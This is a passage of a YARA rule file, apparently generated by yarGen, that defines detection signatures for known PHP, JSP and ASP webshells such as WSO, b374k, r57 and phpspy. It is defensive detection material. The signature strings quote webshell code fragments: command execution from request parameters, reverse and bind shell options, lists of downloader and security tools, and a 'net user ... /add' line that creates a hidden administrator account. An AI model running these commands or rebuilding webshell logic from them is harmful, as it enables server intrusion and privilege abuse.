      $s10 = "wzSaC8e8DQ2TFiTZBEiuJ46wOYSZe20fQN9V9KW5JOhaakPxuA6uhQ5Y3DpUjuSgZ84G6roSostM1TqiOuY/kPUdWyOauRh7MYiuUD0uMqCeuUZcmWmBsI4PQS0PRA03" ascii
      $s11 = "pyZcDZegNVwJzTAJiTMFpmkDsgtEn/Y7YHzuMD5BP1R4NF7yy9lgAbxv+3FzqRz2YD7KprJg9BfC92YEQ6sDkHanQG0Uhg5YoKblG6RbBnJchsD7QXQulqIpoEeZWwvD" ascii
      $s12 = "4kvuyb3nd853ck8cgLhYylymkblIadlzxmNVUXpAuf3vmwOB9pma+DvWhElkhFRhy4Cer/YpaugZ+bdDASfZiktU8+84PaiKqP3Kr+YbOd6CXnqbHpPtltjUzpgAzQK5" ascii
      $s13 = "ccllPAAAAphJREFUOMudk8lPU1EUxvkbXAMdXlug2Kp0eu8ViiUIC2wZJJYqkwUqFiqUMjqgAQppUnAIiBKmFoq0thYKBI0GBGMw0ejGxIVLdyYmYDQ0xPD5HokopmXh" ascii
      $s14 = "exe(xwhich('lwp-download').\" \".$u.\" \".$p);" fullword ascii
      $s15 = "if(strlen($cmd) > 0){" fullword ascii
      $s16 = "if(preg_match('#^cd(\\ )+(.*)$#',$cmd,$r)){" fullword ascii
      $s17 = "$cmd = ss($_REQUEST['cmd']);" fullword ascii
      $s18 = "$group = posix_getgrgid(filegroup($f));" fullword ascii
      $s19 = "$name = posix_getpwuid(fileowner($f));" fullword ascii
      $s20 = "$rshost = $s_server_ip;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_spy_2011_66 {
   meta:
      description = "webshell - from files angel.php, spy.php, 2011.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash3 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
   strings:
      $s1 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s2 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s3 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s4 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s5 = "p('<td>'.((strpos($filedb['server_link'], $_SERVER[\"DOCUMENT_ROOT\"]) !== false) ? '<a href=\"'.$fileurl.'\" target=\"_blank\">" ascii
      $s6 = "p('<td>'.((strpos($filedb['server_link'], $_SERVER[\"DOCUMENT_ROOT\"]) !== false) ? '<a href=\"'.$fileurl.'\" target=\"_blank\">" ascii
      $s7 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s8 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s9 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s10 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s11 = "p('<td align=\"center\">-</td><td nowrap colspan=\"5\"><a href=\"javascript:godir(\\''.getUpPath($nowpath).'\\');\">Parent Direc" ascii
      $s12 = "if ($action == 'login') {" fullword ascii
      $s13 = "p('<td align=\"center\">-</td><td nowrap colspan=\"5\"><a href=\"javascript:godir(\\''.getUpPath($nowpath).'\\');\">Parent Direc" ascii
      $s14 = "scookie('loginpass',encode_pass($password));" fullword ascii
      $s15 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s16 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s17 = "if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {" fullword ascii
      $s18 = "sqldumptable($v);" fullword ascii
      $s19 = "$tabledump .= $create[1].\";\\n\\n\";" fullword ascii
      $s20 = "sqldumptable($v, $fp);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _jsp_custom_spy_for_mysql_jsp_custom_script_for_oracle_67 {
   meta:
      description = "webshell - from files jsp_custom_spy_for_mysql.jsp, jsp_custom_script_for_oracle.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5602d8a781e9f917886d7f84c713554c4d485a276fdab0744790e6b260610202"
      hash2 = "995616ab61521a4d0e2414ad7fb56931f16b3a0fc13930b60ae9a1e709911d62"
   strings:
      $s1 = "        Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "            sb.append(ExecuteCommandCode(pars[1], pars[2]));" fullword ascii
      $s3 = "    String ExecuteCommandCode(String cmdPath, String command) throws Exception {" fullword ascii
      $s4 = "                CopyFileOrDirCode(sourceFilePath + \"/\" + z[j].getName(), targetFilePath + \"/\" + z[j].getName());" fullword ascii
      $s5 = "        ResultSet rs = stmt.executeQuery(sql);" fullword ascii
      $s6 = "    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {" fullword ascii
      $s7 = "        File sf = new File(sourceFilePath), df = new File(targetFilePath);" fullword ascii
      $s8 = "        CopyInputStream(p.getErrorStream(), sb);" fullword ascii
      $s9 = "    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)" fullword ascii
      $s10 = "        return executeSQL(encode, conn, sql, columnsep, rowsep, true);" fullword ascii
      $s11 = "        return executeSQL(encode, conn, sql, columnsep, rowsep, false);" fullword ascii
      $s12 = "        return d + \"\\t\" + driverlist + \"\\t\" + serverInfo + \"\\t\" + user;" fullword ascii
      $s13 = " Shell " fullword ascii
      $s14 = "ChangeLog:" fullword ascii
      $s15 = "            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));" fullword ascii
      $s16 = "    void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {" fullword ascii
      $s17 = "        String funccode = EC(request.getParameter(Pwd) + \"\");" fullword ascii
      $s18 = "        String[] c = { cmdPath, !isWin() ? \"-c\" : \"/c\", command };" fullword ascii
      $s19 = " custom " fullword ascii
      $s20 = "        while ((n = is.read(b)) != -1) {" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_6_source_b374k_2_7_source_68 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash3 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $s2 = "setcookie(\"c[\".$k.\"]\", \"\" ,time() - $s_login_time);" fullword ascii
      $s3 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $s4 = "setcookie(\"theme\", $s_theme ,time() + $s_login_time);" fullword ascii
      $s5 = "setcookie(\"c[\".$s_c_num.\"]\", $s_sql_cookie ,time() + $s_login_time);" fullword ascii
      $s6 = "if($s_sql['type']=='mysql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $s7 = "elseif($s_sql['type']=='sqlite' || $s_sql['type']=='sqlite3') $s_dump_tbl = \"SELECT * FROM \".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $s8 = "elseif($s_sql['type']=='oracle') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" WHERE ROWNUM BETWEEN 0 AND 100;\";" fullword ascii
      $s9 = "elseif($s_sql['type']=='pgsql') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" LIMIT 100 OFFSET 0\";" fullword ascii
      $s10 = "exe(\"tar xf \\\"\".basename($f).\"\\\" -C \\\"\".$s_target.\"\\\"\");" fullword ascii
      $s11 = "exe(\"tar xzf \\\"\".basename($f).\"\\\" -C \\\"\".$s_target.\"\\\"\");" fullword ascii
      $s12 = "if(strpos(strtolower($f), \".tar.gz\")!==false) $s_target = basename($f,\".tar.gz\");" fullword ascii
      $s13 = "$s_rsback[\"back_win\"] = \"Reverse Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $s14 = "elseif(strpos(strtolower($f), \".tgz\")!==false) $s_target = basename($f,\".tgz\");" fullword ascii
      $s15 = "$s_target = basename($f,\".tar\");" fullword ascii
      $s16 = "$s_target = $s_file.basename($f,\".zip\");" fullword ascii
      $s17 = "$s_rsbind[\"bind_php\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- php</span>\";" fullword ascii
      $s18 = "$s_result = exe(\"java \".$s_fpath.\" \".$s_rstarget);" fullword ascii
      $s19 = "if(d.getElementById('cmd')) d.getElementById('cmd').setAttribute('autocomplete', 'off');" fullword ascii
      $s20 = "$s_target = \"\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57_Mohajer22_69 {
   meta:
      description = "webshell - from files r57shell127.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "/*  r57shell.php - " fullword ascii
      $s2 = "$head = '<!-- " fullword ascii
      $s3 = "// $language='eng' - english (" fullword ascii
      $s4 = " CHOWN - " fullword ascii
      $s5 = " CHMOD - " fullword ascii
      $s6 = "// $language='ru' - " fullword ascii
      $s7 = " CHGRP - " fullword ascii
      $s8 = " /etc/passwd'," fullword ascii
      $s9 = " (user -> resu) " fullword ascii
      $s10 = "'ru_text94'=>'FTP-" fullword ascii
      $s11 = "'ru_text88'=>'FTP-" fullword ascii
      $s12 = "'ru_text99'=>'* " fullword ascii
      $s13 = "'ru_text75'=>'* " fullword ascii
      $s14 = ": http://rst.void.ru" fullword ascii
      $s15 = ":\\r\\n- " fullword ascii
      $s16 = ") \\r\\n- " fullword ascii
      $s17 = "'ru_text63'=>'" fullword ascii
      $s18 = "'ru_text80'=>'" fullword ascii
      $s19 = "'ru_text102'=>'" fullword ascii
      $s20 = "'ru_text70'=>'" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_0_wso_4_2_1_wso2_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_70 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, wso2.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "<td><input type=text name=sql_login value=\\\"\". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) .\"" ascii
      $s2 = "<td><input type=text name=sql_login value=\\\"\". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) .\"" ascii
      $s3 = "                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s4 = "    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s5 = "            header(\"Content-Disposition: attachment; filename=dump.sql\");" fullword ascii
      $s6 = "if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))" fullword ascii
      $s7 = "<td><input type=text name=sql_host value=\\\"\". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ." ascii
      $s8 = "                echo \"</textarea><br/><input type=submit value='Execute'>\";" fullword ascii
      $s9 = "<td><input type=text name=sql_host value=\\\"\". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ." ascii
      $s10 = "                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw" ascii
      $s11 = "            req.onreadystatechange = processReqChange;" fullword ascii
      $s12 = "                setcookie('f', '', time() - 3600);" fullword ascii
      $s13 = "                    echo \"<script>d.sf.onsubmit=function(){st(\\\"\" . $_POST['p2'] . \"\\\", d.sf.p3.value)}</script><span>\"." ascii
      $s14 = "        \"process status\" => \"ps aux\"," fullword ascii
      $s15 = "            header(\"Content-Type: text/plain\");" fullword ascii
      $s16 = "                $db->dump($v, $fp);" fullword ascii
      $s17 = "if(isset($_POST['c']))" fullword ascii
      $s18 = "if(@$_POST['type']=='pgsql')echo 'selected';" fullword ascii
      $s19 = "p2'].\"</span> ({$num['n']} records) Page # <input type=text name='p3' value=\" . ((int)$_POST['p3']) . \">\";" fullword ascii
      $s20 = "','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmi" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _2014_2013_71 {
   meta:
      description = "webshell - from files 2014.asp, 2013.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash2 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
   strings:
      $s1 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
      $s2 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
      $s4 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add'" ascii
      $s5 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s6 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
      $s7 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
      $s8 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" <font color=yellow>" fullword ascii
      $s9 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" <font color=chocolate>" fullword ascii
      $s10 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Servu-" fullword ascii
      $s11 = "j cdx&\"<a href='?Action=Alexa' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
      $s12 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" <font color=Turquoise>SQL-----SA\"&ef" fullword ascii
      $s13 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Su---FTP" fullword ascii
      $s14 = "j cdx&\"<a href='?Action=Course' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s15 = "j cdx&\"<a href='?Action=php' target='FileFrame'>\"&cxd&\" <font color=gold>" fullword ascii
      $s16 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Radmin" fullword ascii
      $s17 = "execute(king(\"ufoizgf=ktrsgyg ztl" fullword ascii
      $s18 = "execute(king(\"`>tswqz/<>dkgy/<>kz/<>rz/<>'" fullword ascii
      $s19 = "execute(king(\"`>dkgy/<>'tcqU'=txsqc 'zodwxl'=thnz 'zodwxl'=tdqf zxhfo<;hlwf&;hlwf&;hlwf&>'ztltN'=txsqc 'ztltk'=thnz 'ztltk'=tdq" ascii
      $s20 = "execute(king(\"`>dkgy/<>'tcqU'=txsqc 'zodwxl'=thnz 'zodwxl'=tdqf zxhfo<;hlwf&;hlwf&;hlwf&>'ztltN'=txsqc 'ztltk'=thnz 'ztltk'=tdq" ascii
   condition:
      ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _yijuhua_utils_jsp_jdbc_jsp_72 {
   meta:
      description = "webshell - from files yijuhua.jsp, utils.jsp, jsp.jsp, jdbc.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f4a0353cab22847ddfe6a2f875cb941e5e4dd78c3eadc33d0bc9f2a38bccf606"
      hash2 = "4bfe0d96c929ca04283f61b88dc2382fa4f5f6ea5735f0c3d3900c590e98bda6"
      hash3 = "6b4e479af8f1890e3d56bdf85186f380ba971d4ddc2ca261d076597f290e1456"
      hash4 = "c8ef23e6759e2dd84f28fc1ec5ae913b35c8efb05dd6aa2951aed9fe867553a1"
      hash5 = "322807a2af30c73616c67862e736796f59efe1508ee0fe6ddb1e04f10ef72c06"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s3 = "m.executeUpdate(q);" fullword ascii
      $s4 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s5 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s6 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s7 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s8 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
      $s9 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
      $s10 = "MM(p.getErrorStream(), sb);" fullword ascii
      $s11 = "java.util.Date dt;" fullword ascii
      $s12 = "sb.append(\"ERROR\" + \":// \" + e.toString());" fullword ascii
      $s13 = "java.util.Date dt = fm.parse(t);" fullword ascii
      $s14 = "while ((n = is.read(b, 0, 512)) != -1) {" fullword ascii
      $s15 = "HttpURLConnection h = (HttpURLConnection) u.openConnection();" fullword ascii
      $s16 = "InputStream is = h.getInputStream();" fullword ascii
      $s17 = "int n = d.getColumnCount();" fullword ascii
      $s18 = "ResultSetMetaData d = r.getMetaData();" fullword ascii
      $s19 = "for (int i = 1; i <= d.getColumnCount(); i++) {" fullword ascii
      $s20 = "MM(p.getInputStream(), sb);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule ___1__asp__1___asp_asp__1___2014_10_23_14_54_16___1___2014_10_23_14_54_73 {
   meta:
      description = "webshell - from files  (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash2 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash3 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash4 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash5 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash6 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s13 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s14 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s15 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
      $s16 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s17 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s18 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
      $s19 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s20 = "\":execute(lIl(lI)):Function fsoTreeForMdb(thePath, rs, stream):ExeCute SinfoEn(\"FileL, sysfilesers,  foldlder,theFotem, Dim ii" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _shell_phpspy_2005_full_PHPSPY_phpspy_2006_lnc_phpspy_2005_lite_74 {
   meta:
      description = "webshell - from files shell.php, phpspy_2005_full.php, PHPSPY.php, phpspy_2006.php, lnc.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash3 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
      hash4 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash5 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash6 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s2 = "$result = exec($_POST['command']);" fullword ascii
      $s3 = "system($_POST['command']);" fullword ascii
      $s4 = "} elseif ($execfunc==\"passthru\") {" fullword ascii
      $s5 = "passthru($_POST['command']);" fullword ascii
      $s6 = "echo \"Processed in $totaltime second(s)\";" fullword ascii
      $s7 = "} elseif ($execfunc==\"shell_exec\") {" fullword ascii
      $s8 = "elseif ($_GET['action'] == \"shell\") {" fullword ascii
      $s9 = "if ($_GET['action'] == \"logout\") {" fullword ascii
      $s10 = "@mysql_connect($servername,$dbusername,$dbpassword) or die(\"" fullword ascii
      $s11 = "if ($execfunc==\"system\") {" fullword ascii
      $s12 = "if (!empty($_POST['command'])) {" fullword ascii
      $s13 = "if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {" fullword ascii
      $s14 = "} elseif ($execfunc==\"exec\") {" fullword ascii
      $s15 = "} elseif ($execfunc==\"popen\") {" fullword ascii
      $s16 = "$pp = popen($_POST['command'], 'r');" fullword ascii
      $s17 = "if ($fp = @fopen(\"$dir/test.txt\", 'w')) {" fullword ascii
      $s18 = "@unlink(\"$dir/test.txt\");" fullword ascii
      $s19 = "if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == \"$key\")) {" fullword ascii
      $s20 = "header('Content-type: application/x-'.$fileext);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _in_warn_leo_jfolder01_JFolder_shell1_jsp_75 {
   meta:
      description = "webshell - from files in.jsp, warn.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash3 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash4 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash5 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash6 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash7 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
   strings:
      $s1 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
      $s2 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s3 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s4 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s5 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
      $s6 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
